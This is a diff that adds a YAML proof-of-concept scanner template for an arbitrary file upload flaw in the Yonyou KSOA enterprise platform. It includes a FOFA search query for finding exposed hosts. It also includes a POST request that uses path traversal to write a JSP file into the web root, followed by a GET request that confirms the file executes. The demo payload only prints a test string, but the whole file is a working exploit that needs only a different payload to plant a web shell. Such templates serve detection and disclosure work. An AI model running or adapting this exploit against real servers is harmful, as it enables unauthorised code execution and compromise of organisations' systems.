@@ -1,0 +1,49 @@
+info:
+  vulId: yonyou_ksoa_fileupload
+  detail: 用友-时空KSOA企业信息融通平台任意文件上传漏洞,上传文件地址存放于variable中
+  fofaQuery: app="用友-时空KSOA"
+rules:
+  - request:
+      payload:
+        - <%out.print(\"yonyou ksoa fileupload poc test\"); %>
+      path: "{{rootUrl}}/servlet/com.sksoft.v8.desktop.UploadImage?fileextr=.jsp&rpath=../webapps/ROOT/"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Referer: "{{rootUrl}}"
+        Content-type: multipart/form-data
+        Accept-Encoding: gzip
+      redirect: false
+      dataTtpe: text
+      data: "{{payload}}"
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+      - checkType: regex
+        desireds:
+          - "\\d*?\\.jsp"
+        place: body
+        condition: and
+
+  - request:
+      path: "{{rootUrl}}/{{varitable[0]}}"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+      - checkType: string
+        desireds:
+          - yonyou ksoa fileupload poc test
+        place: body
+        condition: and
